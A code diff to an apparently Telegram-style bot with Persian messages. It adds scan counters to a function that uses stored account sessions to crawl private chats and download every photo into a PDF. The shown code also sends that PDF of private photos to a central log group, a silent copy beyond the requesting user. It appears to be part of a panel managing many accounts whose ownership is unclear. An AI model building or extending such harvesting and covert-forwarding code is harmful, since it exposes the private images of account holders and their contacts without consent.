@@ -1168,7 +1168,9 @@ async def run_pv_export(uid: int, acc):
     async def _do(client):
         out = []
         guids = await rb.get_chat_list_guids(client, only_users=True)
+        scanned = 0
         for g in guids[:config.PV_EXPORT_MAX_CHATS]:
+            scanned += 1
             async for _mid, fi in rb.iter_chat_photos(client, g):
                 try:
                     blob = await rb.download_photo(client, fi)
@@ -1177,11 +1179,12 @@ async def run_pv_export(uid: int, acc):
                 except Exception:
                     continue
                 if len(out) >= config.PV_EXPORT_MAX_PHOTOS:
-                    return out
-        return out
+                    return out, len(guids), scanned
+        return out, len(guids), scanned
 
     try:
-        photos = await account_conn.call(phone, _do, timeout=1800)
+        photos, total_chats, scanned_chats = await account_conn.call(
+            phone, _do, timeout=1800)
     except account_conn.InvalidAuthError:
         db.set_status(acc["id"], "inactive")
         await _safe_send(uid, "🔴 سشن این اکانت باطله. دوباره اضافه‌اش کن.")
@@ -1191,7 +1194,9 @@ async def run_pv_export(uid: int, acc):
         return
 
     if not photos:
-        await _safe_send(uid, f"ℹ️ هیچ عکسی در پیوی‌های {phone} پیدا نشد.")
+        await _safe_send(uid,
+                         f"ℹ️ هیچ عکسی در پیوی‌های {phone} پیدا نشد.\n"
+                         f"(چت‌های اسکن‌شده: {scanned_chats} از {total_chats})")
         return
 
     import pdf_export
@@ -1199,7 +1204,9 @@ async def run_pv_export(uid: int, acc):
     try:
         n = await asyncio.to_thread(pdf_export.build_pdf, photos, out_path)
         await logbus.event("🖼 PV IMAGE EXPORT", [
-            f"🆔 {uid}", f"📱 {phone}", f"🖼 {n} عکس", f"🕒 {now()}"])
+            f"🆔 {uid}", f"📱 {phone}",
+            f"💬 چت اسکن‌شده: {scanned_chats} از {total_chats}",
+            f"🖼 {n} عکس", f"🕒 {now()}"])
         # the import-images file itself is logged to the central group
         await logbus.to_group_file(out_path,
                                    caption=f"🖼 فایل ایمپورت تصاویر — {phone} ({n})")
